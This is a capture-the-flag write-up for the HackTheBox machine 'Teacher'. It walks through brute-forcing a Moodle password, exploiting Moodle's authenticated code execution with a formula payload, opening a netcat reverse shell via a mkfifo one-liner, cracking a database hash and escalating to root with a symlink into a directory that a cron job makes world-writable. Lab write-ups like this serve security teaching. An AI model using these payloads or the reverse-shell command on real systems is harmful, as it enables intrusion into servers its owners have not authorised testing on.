### Quick Summary
#### Hey guys , today Teacher retired and here is my write-up about it. I don't have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to `/root` or anything else we want to access. It's a linux box and its ip is `10.10.10.153` I added it to `/etc/hosts` as `teacher.htb`. Let's jump right in !

### Nmap
#### As always we will start with nmap to scan for open ports and services : 
`nmap -sV -sT -sC teacher.htb`
![](/images/hackthebox/teacher/1.png)
#### We only see http running on port 80. Let's see what's in there.

### HTTP Initial Enumeration
![](/images/hackthebox/teacher/2.png)
#### There is just a static website titled `Blackhat highschool` , I looked into other pages like `Courses` , `Students` etc... And also checked their source code. And on `Gallery` : 
![](/images/hackthebox/teacher/3.png)
#### I found this line in the source :
![](/images/hackthebox/teacher/4.png)
#### for `<img src="images/5.png">` there is an `onerror` attribute to print `That's an F` in the console. So I checked the console : 
![](/images/hackthebox/teacher/5.png)
#### Weird let's check that image. `http://teacher.htb/images/5.png` :
![](/images/hackthebox/teacher/6.png)
#### Corrupted file ? Let's check if it's really a corrupted image or it's not an image at all :
`curl http://teacher.htb/images/5.png`

Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.                                                 

Could you guys figure out what the last charachter is, or just reset it?                                                                   

Thanks,
Giovanni

#### Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` in the background and got some results , one of them was `/moodle`. 
`http://teacher.htb/moodle`

#### On the login page there's a guest login :
![](/images/hackthebox/teacher/9.png)
#### However I couldn't achieve anything from that guest login.

<hr>
### Bruteforcing the last character
#### We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password.
#### `for i in {a..z}; do echo Th4C00lTheacha$i; done > list.txt` this will print all the letters next to `Th4C00lTheacha`
#### Then I added some special chars manually like `!@#$%^&*()_-+=.?/\` and finally I added numbers : `for i in {0..9}; do echo Th4C00lTheacha$i; done >> list.txt`
#### `list.txt` : 
```

#### Since it's a small list , I used burp intruder to bruteforce the password. Let's intercept the request and send it to intruder :
![](/images/hackthebox/teacher/10.png)
<br>
<br>
![](/images/hackthebox/teacher/11.png)
<br>
<br>
![](/images/hackthebox/teacher/12.png)
#### After it's finished , all the responses were 870 bytes in length except the response of the payload `Th4C00lTheacha#`.
![](/images/hackthebox/teacher/13.png)
#### So probably this is the right password , let's check.
![](/images/hackthebox/teacher/14.png)
#### It worked and now we are in as `Giovanni`
<br>
<hr>
### RCE , Initial Shell as `www-data`
#### After some enumeration I didn't find anything interesting , so I searched on Google and found this [article](https://blog.ripstech.com/2018/moodle-remote-code-execution/). Let's try to reproduce that vulnerability.
#### First , we will go to the `Algebra` course :
![](/images/hackthebox/teacher/15.png)
#### Then we will turn editing on :
![](/images/hackthebox/teacher/16.png)
#### Now we can edit the course , so we will choose any topic and click on `Add an activity or resource` and we will choose `Quiz` :
![](/images/hackthebox/teacher/17.png)
#### Then we will just fill in the required information :
![](/images/hackthebox/teacher/18.png)
#### And click on `Save and display`.
![](/images/hackthebox/teacher/19.png)
#### After that we will click on `edit quiz` :
![](/images/hackthebox/teacher/20.png)
#### And add a new question. Question type will be `Calculated` :
![](/images/hackthebox/teacher/21.png)
<br>
<br>
![](/images/hackthebox/teacher/22.png)
#### Again we will fill in the required information :
![](/images/hackthebox/teacher/23.png)
#### And finally we reach the actual exploitation , we will set the answer formula to :
```
/*{a*/`$_GET[0]`;//{x}}`
```
![](/images/hackthebox/teacher/24.png)
#### This will allow us to pass system commands through a url parameter called `0` , More info about how the exploit is working can be found in the previously mentioned article.
#### After saving the changes we will get this page : 
![](/images/hackthebox/teacher/25.png)
#### We will click on `Next Page` to finally get to the vulnerable page :
![](/images/hackthebox/teacher/26.png)
#### Let's add the parameter `0` and get a reverse shell :
#### Shell : `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f`
![](/images/hackthebox/teacher/27.png)
#### Note : the payload is url encoded. So final payload will be : `&0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+ip+port+>/tmp/f`
#### After sending the request , our listener gets a callback. And we get a reverse shell as `www-data` :
![](/images/hackthebox/teacher/28.png)
#### There is only `giovanni` on the box and we can't access his `/home` directory as `www-data`.
![](/images/hackthebox/teacher/29.png)
<hr>
### Hardcoded Database Credentials , Privilege Escalation to `giovanni`
#### Back to `/var/www/html/moodle` , I wanted to check config files and other stuff to see if there are any information that can help. And in `config.php` I found database credentials :
![](/images/hackthebox/teacher/30.png)
#### Sweet , Let's see what's in there.
`mysql -h 127.0.0.1 -u root -p`
![](/images/hackthebox/teacher/31.png)
#### We are not in any database `[(none)]` , Let's list the databases :
`SHOW DATABASES;`
![](/images/hackthebox/teacher/32.png)
#### `moodle` is interesting and might have some passwords.
`USE moodle;`
![](/images/hackthebox/teacher/33.png)
#### Now let's check the tables :
`SHOW TABLES;`
![](/images/hackthebox/teacher/34.png)
#### A lot of tables , but an interesting one is called `mdl_user` :
![](/images/hackthebox/teacher/35.png)
#### Alright , let's see what's in that table :
`SELECT * from mdl_user;`
![](/images/hackthebox/teacher/36.png)
#### We didn't get the best output :D but anyway I looked into it and found this `md5` hash :
![](/images/hackthebox/teacher/37.png)
#### And its name is `Giovannibak` , probably a backup for giovanni's password. [crackstation](https://crackstation.net/) was able to crack it :
![](/images/hackthebox/teacher/38.png)
#### The password is `expelled`, we can `su` to `giovanni`
![](/images/hackthebox/teacher/39.png)
#### Now we own user.
<br>
<hr>
### `777`. Ability to read , write and execute anything on the system
#### In giovanni's `/home` directory there is a directory called `work` which has two directories `courses` and `tmp`. Nothing Special.
![](/images/hackthebox/teacher/40.png)
<br>
<br>
![](/images/hackthebox/teacher/41.png)
#### After a lot of enumeration I found in `/usr/bin` a script called `backup.sh` :
![](/images/hackthebox/teacher/42.png)
<br>
<br>
![](/images/hackthebox/teacher/43.png)
#### We don't really care about the `tar` commands , What we care about is that it's changing current directory to `/home/giovanni/work` then changes it once again to `/home/giovanni/work/tmp` then changes permissions to `777` recursively. This means that any user can read , write and execute any file in `/home/giovanni/work/tmp`. So if we created a symlink for `/root` in `/home/giovanni/work/tmp` and wait for the script to get executed by root (cronjob) we will have access to `/root`. In normal conditions creating a symlink to `/root` won't let you have access to it if you don't have the permissions to. Because it's still linking to a directory that you are not authorized to access. But since the script runs `chmod 777` on `/home/giovanni/work/tmp` recursively, Anyone has access to what's in there even symlinks. This [article](https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/) explains it very well. Read [this](https://stackabuse.com/symbolic-links-in-unix-linux/) if you don't know what's a symlink.
#### Alright , Let's create a symlink for `/root` in `/home/giovanni/work/tmp`
`ln -s /root ./tmp`

<br>
![](/images/hackthebox/teacher/45.png)
#### And we owned root !
